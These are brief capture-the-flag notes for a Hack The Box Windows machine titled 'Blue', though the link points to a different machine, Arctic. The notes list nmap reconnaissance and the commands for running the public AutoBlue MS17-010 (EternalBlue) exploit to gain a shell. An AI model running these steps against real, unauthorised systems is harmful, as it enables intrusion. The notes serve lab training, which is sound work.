# Blue
* Link: https://app.hackthebox.com/machines/Arctic
* Type: Windows
* Difficulty: Easy

## Commands Used
* *nmap -sC -sV -oA OUTPUTDIR IPADDRESS* - Nmap scan.
* *nmap --script vuln -oA vuln IPADDRESS* - Runs vulnerability scan on the IP address provided.
* *nmap -p 445 --script safe -Pn -n IPADDRESS* - Runs safe scripts on the provided port (Good to do after identifying the open ports)
* *https://github.com/3ndG4me/AutoBlue-MS17-010*
  - *python eternal_checker.py IPADDRESS*
  - *pip install -r requirements.txt*
  - *./shell_prep.sh*
  - *./listener_prep.sh*
  - *python eternalblue_exploit7.py TARGETIPADDRESS PATHTOSHELLCODE/sc_64x.bin>* - When I used *all* it crashed the box so use the specific architecture (x64 or x32)

* *enum4linux -a IPADDRESS* - enum on windows machines.


## Steps
* Start by checking the open ports using nmap (nmap -sC -sV -oA DIR IPADDRESS)
* There is smb port open (445).
* Check if eternal blue is applicable using nmap script.
* Search for PoC for the CVE.
* Use the CVE to get root access.
